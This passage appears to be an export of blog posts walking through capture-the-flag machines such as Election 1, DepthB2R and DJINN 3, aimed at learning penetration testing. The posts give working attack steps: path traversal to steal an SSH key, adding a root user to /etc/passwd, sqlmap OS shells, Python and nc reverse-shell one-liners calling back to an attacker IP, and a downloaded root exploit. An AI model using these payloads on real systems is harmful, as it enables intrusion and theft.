OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb Enumeration âž¡ï¸Now lets see the Directory Listing files â€”&gt;feroxbuster -u https://10.0.2.51:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 2 -C 403,404 -x php,html,txt,jsNow lets look at /secret/evil.php file â€”&gt;Since it is blank I think this url is vulnerable to path traversal attack , but for that I need a parameter on which basis I am gona search the /etc/passwd file â€”&gt;Lets use burpsuite for that â€”&gt;parameter fuzzing list â¤µï¸https://github.com/StrongShiv8/Wordlists-/blob/main/fuzz-lfi-params-list.txtLets see the result on web â€”&gt;Now I know user mowree so lets access for ssh private key through /home/mowree/.ssh/id_rsa â†’http://10.0.2.51/secret/evil.php?command=/home/mowree/.ssh/id_rsaLets get this file and decode its paraphrase value through john-the-ripper tool â†’so the paraphrase for ssh login is : unicornNow its time for ssh login â†’Lets check what we got here â†’mowree@EvilBoxOne:~$ ls -altotal 32drwxr-xr-x 4 mowree mowree 4096 ago 16 2021 .drwxr-xr-x 3 root root 4096 ago 16 2021 ..lrwxrwxrwx 1 root root 9 ago 16 2021 .bash_history -&gt; /dev/null-rwxr-xr-x 1 mowree mowree 220 ago 16 2021 .bash_logout-rwxr-xr-x 1 mowree mowree 3526 ago 16 2021 .bashrcdrwxr-xr-x 3 mowree mowree 4096 ago 16 2021 .local-rwxr-xr-x 1 mowree mowree 807 ago 16 2021 .profiledrwxr-xr-x 2 mowree mowree 4096 ago 16 2021 .ssh-r-------- 1 mowree mowree 31 ago 16 2021 user.txtmowree@EvilBoxOne:~$ cat user.txt 56Rbp0soobpzWSVzKh9YOvzGLgtPZQmowree@EvilBoxOne:~$Now lets see some file permissions and looks like I got something interesting â†’mowree@EvilBoxOne:/var/backups$ ls -al /etc/passwd-rw-rw-rw- 1 root root 1398 ago 16 2021 /etc/passwdNow I have the permission to write so lets add a user name as shiv and password as password with root privileges.First we need to choose a password, salt it and hash the result. openssl to the rescue.Flags: -1Â what hashing algorithm to use. In our use case it doesnt matter, therefore we use MD5 which should be avoided in real world PT as it is not secure. -salt saltÂ string to use as salt. I choose the string salt passwordÂ clear text password we would like to use.$ openssl passwd -1 -salt salt password$1$salt$qJH7.N4xYta3aEG/dfqo/0we need to add some data in order for it to be aligned with theÂ /etc/passwdÂ format. This is the final result:shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bashI named the userÂ shiv. now lets write into the /etc/passwd file with nano â†’Now lets switch to shiv user â€”&gt;mowree@EvilBoxOne:~$ su shivContraseÃ±a: root@EvilBoxOne:/home/mowree# whoamirootroot@EvilBoxOne:/home/mowree# cd ~root@EvilBoxOne:~# ls -altotal 24drwx------ 3 root root 4096 ago 16 2021 .drwxr-xr-x 18 root root 4096 ago 16 2021 ..lrwxrwxrwx 1 root root 9 ago 16 2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 3526 ago 16 2021 .bashrcdrwxr-xr-x 3 root root 4096 ago 16 2021 .local-rw-r--r-- 1 root root 148 ago 17 2015 .profile-r-------- 1 root root 31 ago 16 2021 root.txtroot@EvilBoxOne:~# cat root.txt 36QtXfdJWvdC0VavlPIApUbDlqTsBMroot@EvilBoxOne:~# If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "Election 1", "url": "/posts/Election-1/", "categories": "Proving Grounds, Play", "tags": "CMS, Public Exploit, SUIDs, Sqlmap, election_2.0_CMS, PrivEsc, Serv-U", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Election-1/Untitled.png)```bashIP : 10.0.2.53```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_G...", "content": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Election-1/Untitled.png)```bashIP : 10.0.2.53```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Electron]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.53Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 14:19 ISTNmap scan report for 10.0.2.53Host is up (0.0017s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)| 256 7889b3a2751276922af98d27c108a7b9 (ECDSA)|_ 256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 08:00:27:BA:FC:33 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Election-1/Untitled%201.png)Lets check for directory listing through `Feroxbuster` Tool â€”>```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Electron]â””â”€$ feroxbuster -u http://10.0.2.53:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 2 -C 403,404 -x php,html,txt,log ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ðŸ¤“ ver: 2.9.1â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸŽ¯ Target Url â”‚ http://10.0.2.53:80/ ðŸš€ Threads â”‚ 100 ðŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ðŸ’¢ Status Code Filters â”‚ [403, 404] ðŸ’¥ Timeout (secs) â”‚ 7 ðŸ¦¡ User-Agent â”‚ feroxbuster/2.9.1 ðŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ðŸ’¾ Output File â”‚ ferox_80.json ðŸ’² Extensions â”‚ [php, html, txt, log] ðŸ HTTP methods â”‚ [GET] ðŸ”ƒ Recursion Depth â”‚ 2 ðŸŽ‰ New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latestâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ Press [ENTER] to use the Scan Management Menuâ„¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€404 GET 9l -w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 375l 964w 10918c http://10.0.2.53/200 GET 375l 964w 10918c http://10.0.2.53/index.html301 GET 9l 28w 311c http://10.0.2.53/javascript => http://10.0.2.53/javascript/200 GET 4l 4w 30c http://10.0.2.53/robots.txt301 GET 9l 28w 309c http://10.0.2.53/election => http://10.0.2.53/election/301 GET 9l 28w 315c http://10.0.2.53/election/media => http://10.0.2.53/election/media/301 GET 9l 28w 316c http://10.0.2.53/election/themes => http://10.0.2.53/election/themes/301 GET 9l 28w 314c http://10.0.2.53/election/data => http://10.0.2.53/election/data/301 GET 9l 28w 315c http://10.0.2.53/election/admin => http://10.0.2.53/election/admin/301 GET 9l 28w 313c http://10.0.2.53/election/lib => http://10.0.2.53/election/lib/301 GET 9l 28w 319c http://10.0.2.53/election/languages => http://10.0.2.53/election/languages/301 GET 9l 28w 312c http://10.0.2.53/election/js => http://10.0.2.53/election/js/200 GET 1l 215w 1935c http://10.0.2.53/election/card.php301 GET 9l 28w 311c http://10.0.2.53/phpmyadmin => http://10.0.2.53/phpmyadmin/200 GET 26l 359w 10531c http://10.0.2.53/phpmyadmin/index.php301 GET 9l 28w 318c http://10.0.2.53/phpmyadmin/themes => http://10.0.2.53/phpmyadmin/themes/200 GET 26l 359w 10532c http://10.0.2.53/phpmyadmin/themes.php401 GET 14l 54w 456c http://10.0.2.53/phpmyadmin/setup200 GET 26l 359w 10535c http://10.0.2.53/phpmyadmin/db_search.php[####################] - 5m 5513650/5513650 0s found:19 errors:970056 [####################] - 4m 1102730/1102730 4038/s http://10.0.2.53:80/ [####################] - 4m 1102730/1102730 3792/s http://10.0.2.53/ [####################] - 5m 1102730/1102730 3427/s http://10.0.2.53/javascript/ [####################] - 4m 1102730/1102730 4141/s http://10.0.2.53/election/ [####################] - 3m 1102730/1102730 5284/s http://10.0.2.53/phpmyadmin/```{: .nolineno}![Untitled](/Vulnhub-Files/img/Election-1/Untitled%202.png)Now lets check these files from directory or files bruteforcing â†’ `/card.php` file![Untitled](/Vulnhub-Files/img/Election-1/Untitled%203.png)Now lets decode this text â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%204.png)Now I got a credentails â†’```bashuser:1234pass:Zxc123!@#```{: .nolineno}Lets us this credentails to log into the `/election/admin` â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%205.png)Now After recon on web I got an exploit about the election 2.0 â†’[https://www.exploit-db.com/exploits/48122](https://www.exploit-db.com/exploits/48122)![Untitled](/Vulnhub-Files/img/Election-1/Untitled%206.png)Now lets follow this path â€”>Lets see for sqli â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%207.png)Lets add a candidate and then Intercept the candidate option â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%208.png)Now letâ€™s save the request into a text file â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%209.png)Now lets run sqlmap â†’```bashsqlmap -r request.txt --level=5 --risk=3 --os-shell -p id```{: .nolineno}![Untitled](/Vulnhub-Files/img/Election-1/Untitled%2010.png)Now lets run this reverse shell code of python â†’```bashpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.27\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'```{: .nolineno}![Untitled](/Vulnhub-Files/img/Election-1/Untitled%2011.png)Now lets check the response with nc â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%2012.png)Now I got a reverse shell â†’```bashwww-data@election:/var/www/html/election/admin/logs$ cat sys\tcat system.log [2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123[2020-04-03 00:13:53] Love added candidate 'Love'.[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).[2023-05-10 15:40:18] Love has been logged in from Unknown IP on Firefox (Linux).[2023-05-10 16:10:49] Love added candidate 'Test'.www-data@election:/var/www/html/election/admin/logs$```{: .nolineno}Lets switch to love user â†’```bashlove@election:~$ cd Desk\tcd Desktop/love@election:~/Desktop$ lslsuser.txtlove@election:~/Desktop$ cat user.txt cat user.txtcd38ac698c0d793a5236d01003f692b0love@election:~/Desktop$```{: .nolineno}Now lets check the SUIDs files â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%2013.png)Now I looked into web for more recon purpose â†’[https://www.exploit-db.com/exploits/47009](https://www.exploit-db.com/exploits/47009)![Untitled](/Vulnhub-Files/img/Election-1/Untitled%2014.png)Lets transfer it to the victim machine â†’![Untitled](/Vulnhub-Files/img/Election-1/Untitled%2015.png)```bashlove@election:/usr/local/Serv-U$ cd /tmp cd /tmplove@election:/tmp$ lslslove@election:/tmp$ wget https://www.exploit-db.com/download/47009wget https://www.exploit-db.com/download/47009--2023-05-10 17:08:36-- https://www.exploit-db.com/download/47009Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 619 [application/txt]Saving to: â€˜47009â€™47009 100%[===================>] 619 --.-KB/s in 0s 2023-05-10 17:08:37 (109 MB/s) - â€˜47009â€™ saved [619/619]love@election:/tmp$ ls -alls -altotal 12drwxrwxrwt 2 root root 4096 May 10 17:08 .drwxr-xr-x 24 root root 4096 Apr 8 2020 ..-rw-rw-r-- 1 love love 619 May 10 17:08 47009love@election:/tmp$ chmod +x 47009chmod +x 47009love@election:/tmp$ mv 47009 exploit.cmv 47009 exploit.clove@election:/tmp$ lslsexploit.clove@election:/tmp$ gcc exploit.c -o pe && ./pegcc exploit.c -o pe && ./peuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)opening root shell# whoamiwhoamiroot# /bin/bash -i/bin/bash -iroot@election:/tmp# cd /rootcd /rootroot@election:/root# ls -alls -altotal 44drwx------ 6 root root 4096 May 10 14:13 .drwxr-xr-x 24 root root 4096 Apr 8 2020 ..-rw------- 1 root root 66 May 27 2020 .bash_historydrwx------ 3 root root 4096 Apr 8 2020 .cachedrwx------ 5 root root 4096 May 27 2020 .configdrwx------ 3 root root 4096 Oct 20 2019 .gnupgdrwxr-xr-x 3 root root 4096 Oct 20 2019 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 33 Apr 9 2020 root.txt-rw-r--r-- 1 root root 66 Apr 2 2020 .selected_editor-rw-r----- 1 root root 5 May 10 14:14 .vboxclient-display-svga.pidroot@election:/root# cat root.txtcat root.txt5238feefc4ffe09645d97e9ee49bc3a6root@election:/root#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Drifting Blue 1", "url": "/posts/Drifting-Blue-1/", "categories": "Proving Grounds, Play", "tags": "DirtyCow, Password Bruteforce, PrivEsc, fcrackzip, File Upload", "date": "2023-06-14 00:00:00 +0530", "snippet": "Description â¤µï¸ ðŸ’¡ DriftingBlues: 1get flagsdifficulty: easyabout vm: tested and exported from virtualbox. dhcp and nested vtx/amdv enabled. you can contact me by email (it should be on my profile) ...", "content": "Description â¤µï¸ ðŸ’¡ DriftingBlues: 1get flagsdifficulty: easyabout vm: tested and exported from virtualbox. dhcp and nested vtx/amdv enabled. you can contact me by email (it should be on my profile) for troubleshooting or questions.Letâ€™s find the IP Address firstÂ Â»IP : 10.0.2.19Port Scan Results âž¡ï¸OPEN PORT &gt;80 HTTPWeb Enumeration â¤µï¸While checking the source code of this site page I got this â†’Now I have to crack the password for the sapmmer.zip file â†’myspace4mayer : lionheartNow I got in lets try for reverse shell â†’Now Only I have to load this url â†’ http://10.0.2.19/textpattern/files/shell.phpSHELL âž¡ï¸config.php file for credentials â†’drifter : imjustdrifting31Now I checked SUIDs and GUIDs files â†’I am not able to run any exploit of exim so let is check the kernel version and exploit it accordingly â†’Now lets try it out â†’Now lets run su firefart â†’ If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "DepthB2R", "url": "/posts/DepthB2R/", "categories": "Proving Grounds, Play", "tags": "Firewall Disable, Recon, nikto, PrivEsc, Command Injection", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the IP address â†’ ![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled.png)```bashIP : 10.0.2.44```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/De...", "content": "### Lets check the IP address â†’ ![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled.png)```bashIP : 10.0.2.44```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/DepthB2R]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.44Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 11:29 ISTNmap scan report for 10.0.2.44Host is up (0.00079s latency).Not shown: 65534 filtered tcp ports (no-response)PORT STATE SERVICE VERSION8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1|_http-server-header: Apache-Coyote/1.1| http-methods: |_ Potentially risky methods: PUT DELETE|_http-title: Apache TomcatMAC Address: 08:00:27:FC:6B:6D (Oracle VirtualBox virtual NIC)```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%201.png)Now after directory or files bruteforcing though `Feroxbuster` Tool I got this â†’![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%202.png)Now lets load the directory /manager/ âž¡ï¸![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%203.png)Now while nikto scan I got a file > `test.jsp` â†’```bashNikto.txtâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/DepthB2R]â””â”€$ nikto -h http://10.0.2.44:8080/ -o nikto.txt -C all- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP: 10.0.2.44+ Target Hostname: 10.0.2.44+ Target Port: 8080+ Start Time: 2023-05-04 11:51:21 (GMT5.5)---------------------------------------------------------------------------+ Server: Apache-Coyote/1.1+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.+ /: Appears to be a default Apache Tomcat install.+ /manager/html: Default Tomcat Manager / Host Manager interface found.+ /test.jsp: This might be interesting.+ /manager/status: Default Tomcat Server Status interface found.+ 26792 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2023-05-04 11:53:28 (GMT5.5) (127 seconds)---------------------------------------------------------------------------+ 1 host(s) tested```{: .nolineno}![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%204.png)![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%205.png)Now lets see inside the home which user is there â†’![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%206.png)> User : bill , So lets **disable the firewall** so that I can execute my reverse shell command through ssh.{: .prompt-info }![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%207.png)command : `sudo ufw disable` to disable the firewall but I have to use ssh bill@localhost first so that it can be executed .![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%208.png)Now lets start the listener port 4444 with nc and then execute the payload for reverse shell .```bashpayload :ssh bill@localhost python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.27\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'```{: .nolineno}In response I got this âž¡ï¸![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%209.png)Lets see how bill can lead us to root â†’```bashbill@b2r:~$ sudo -lsudo -lMatching Defaults entries for bill on b2r: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser bill may run the following commands on b2r: (ALL : ALL) NOPASSWD: ALLbill@b2r:~$```{: .nolineno}![Untitled](/Vulnhub-Files/img/DepthB2R/Untitled%2010.png)Now I am root â†’```bashroot@b2r:/root# cat flagcat flagflag{WellThatWasEasy}root@b2r:/root#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Deception", "url": "/posts/Deception/", "categories": "Proving Grounds, Play", "tags": "Recon, SUIDs, python, Wordpress, PrivEsc, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the Victim Machines IP address â¤µï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled.png)```bashIP : 10.0.2.40```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Dece...", "content": "### Lets check the Victim Machines IP address â¤µï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled.png)```bashIP : 10.0.2.40```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Deception]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.40Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 13:32 ISTNmap scan report for 10.0.2.40Host is up (0.00088s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 9dd098da0d323d0b3f424dd7934ffd60 (RSA)| 256 4cf42e2482cf9c8de20c524b2ea512d9 (ECDSA)|_ 256 a9fbe3f4bad61e72e7972582876eea01 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 08:00:27:86:C5:24 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration âž¡ï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%202.png)Now with directory or files bruteforcing through `feroxbuster` Tool, I got wordpress site âž¡ï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Deception/Untitled%204.png)Now with `wpscan` Tool results I got 2 users â¬‡ï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%205.png)Now after directory listing in `wordpress` I got many things like â¬‡ï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%206.png)`robots.html` >>![Untitled](/Vulnhub-Files/img/Deception/Untitled%207.png)`admindelete.html` >>![Untitled](/Vulnhub-Files/img/Deception/Untitled%208.png)Now let â€˜s find api tokens âž¡ï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%209.png)```bashAPI old0 : 5F4DCC3B5AAAPI old1 : 765D61D8API old2 : 327DEBAPI new : 882CF99API token : 5F4DCC3B5AA765D61D8327DEB882CF99```{: .nolineno}After decoding this md5 hash , I got this >>![Untitled](/Vulnhub-Files/img/Deception/Untitled%2010.png)Now lets load this with wordpress url â¤µï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%2011.png)```bashCredentials for SSH >>username : you know it >> yashpassword : password >> 5F4DCC3B5AA765D61D8327DEB882CF99```{: .nolineno}```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Deception]â””â”€$ sudo ssh yash@10.0.2.40 [sudo] password for kali: The authenticity of host '10.0.2.40 (10.0.2.40)' can not be established.ED25519 key fingerprint is SHA256:akKQEcWIOuFc7fx+2sf5jLIEVND/B8BYsa+iUz05NCA.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.40' (ED25519) to the list of known hosts.yash@10.0.2.40 is password: Permission denied, please try again.yash@10.0.2.40 is password: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.0.0-23-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch219 packages can be updated.128 updates are security updates.New release '20.04.6 LTS' available.Run 'do-release-upgrade' to upgrade to it.Last login: Sat Feb 15 19:58:38 2020opeartion going on=====================> Copy password to /haclabsSystem compromised!!!ALERTCopy operation abortedyash@haclabs:~$yash@haclabs:~$ cat flag1.txtJUST BELIEVE IN YOU!!71C480DF93D6AE2F1EFAD1447C66C9525E316218CF51FC8D9ED832F2DAF18B73```{: .nolineno}Now lets check the SUIDs files âž¡ï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%2012.png)Lets exploit with python2.7 â¤µï¸![Untitled](/Vulnhub-Files/img/Deception/Untitled%2013.png)![Untitled](/Vulnhub-Files/img/Deception/Untitled%2014.png)I found the 2nd flag inside the haclabs directory >>```bash# cat flag2.txtc2Vjb25kIGZsYWcgOiBGQkM5NDQ2MDExQ0Y1QjE5OEVEOTU5NkNFRkJDNzlCQgpCdXQgc3RpbGwgaXQgaXMgbm9vT0JCIQo=#Attckers Machine >>â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Deception]â””â”€$ echo \"c2Vjb25kIGZsYWcgOiBGQkM5NDQ2MDExQ0Y1QjE5OEVEOTU5NkNFRkJDNzlCQgpCdXQgc3RpbGwgaXQgaXMgbm9vT0JCIQo=\" | base64 -dsecond flag : FBC9446011CF5B198ED9596CEFBC79BBBut still it is nooOBB!```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DJINN 3", "url": "/posts/DJINN-3/", "categories": "Proving Grounds, Play", "tags": "Public Exploit, SSTI, PrivEsc, sudo exploit, jinja", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DJINN-3](https://www.vulnhub.com/entry/djinn-3,492/)**- **Level:** Intermediate- **flags**: root.txt- **Description:** The machine is VirtualBox as well as VMWare compati...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DJINN-3](https://www.vulnhub.com/entry/djinn-3,492/)**- **Level:** Intermediate- **flags**: root.txt- **Description:** The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You'll see the IP right on the login screen. You have to read the root flag.{: .prompt-info }### Letâ€™s find the IP Address first >>![167-1.png](/Vulnhub-Files/img/DJINN-3/167-1.png)```bashIP : 10.0.2.20```{: .nolineno}## Port Scan Results âž¡ï¸![167-2.png](/Vulnhub-Files/img/DJINN-3/167-2.png)```bashOPEN PORTS >22 SSH80 HTTP5000 HTTP31337 Elite?```{: .nolineno}## Web Enumeration â¤µï¸![167-3.png](/Vulnhub-Files/img/DJINN-3/167-3.png)![167-4.png](/Vulnhub-Files/img/DJINN-3/167-4.png)So the port `31337` is for netcat connection â†’ I guess the username & password as `guest:guest` and I got in â†’![167-5.png](/Vulnhub-Files/img/DJINN-3/167-5.png)Now lets check for `SSTI vulnerability` â†’![167-6.png](/Vulnhub-Files/img/DJINN-3/167-6.png)![167-7.png](/Vulnhub-Files/img/DJINN-3/167-7.png)So I guess we have `SSTI vulnerability` so lets exploit â†’Since my payload land into `jinja` catagory of `SSTI` so â†’![167-8.png](/Vulnhub-Files/img/DJINN-3/167-8.png)![djinn3.png](/Vulnhub-Files/img/djinn3.png)![167-9.png](/Vulnhub-Files/img/DJINN-3/167-9.png)So After using this payload I got response as â†’![167-10.png](/Vulnhub-Files/img/DJINN-3/167-10.png)So now lets have a reverse shell and I will be using this nc reverse shell payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc >/tmp/f` to do so â†’![167-11.png](/Vulnhub-Files/img/DJINN-3/167-11.png)![167-12.png](/Vulnhub-Files/img/DJINN-3/167-12.png)___## SHELL âž¡ï¸![167-13.png](/Vulnhub-Files/img/DJINN-3/167-13.png)Now I have used one exploit to counter this linux machine â†’And this time I exploited the sudo version â†’![167-14.png](/Vulnhub-Files/img/DJINN-3/167-14.png)URL â†’ [https://github.com/worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)![167-15.png](/Vulnhub-Files/img/DJINN-3/167-15.png)Now lets use the `exploit_nss.py` exploit â†’![167-16.png](/Vulnhub-Files/img/DJINN-3/167-16.png)![167-17.png](/Vulnhub-Files/img/DJINN-3/167-17.png)___> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 9", "url": "/posts/DC-9/", "categories": "Proving Grounds, Play, DC", "tags": "Password Bruteforce, Knocking Ports, LFI, Sqlmap, PrivEsc, DC", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DC-9](https://www.vulnhub.com/entry/dc-9,412/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The u...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DC-9](https://www.vulnhub.com/entry/dc-9,412/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I would not give you the answer, instead, I'll give you an idea about how to move forward.**TECHNICAL INFORMATION**DC-9 is a VirtualBox VM built on Debian 64 bit, but there should not be any issues running it on most PCs.DC-9 has been tested successfully on VMWare Player, but if there are any issues running this VM in VMware, have a read through ofÂ [this](https://www.five86.com/vmware.html).It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.**IMPORTANT**While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In 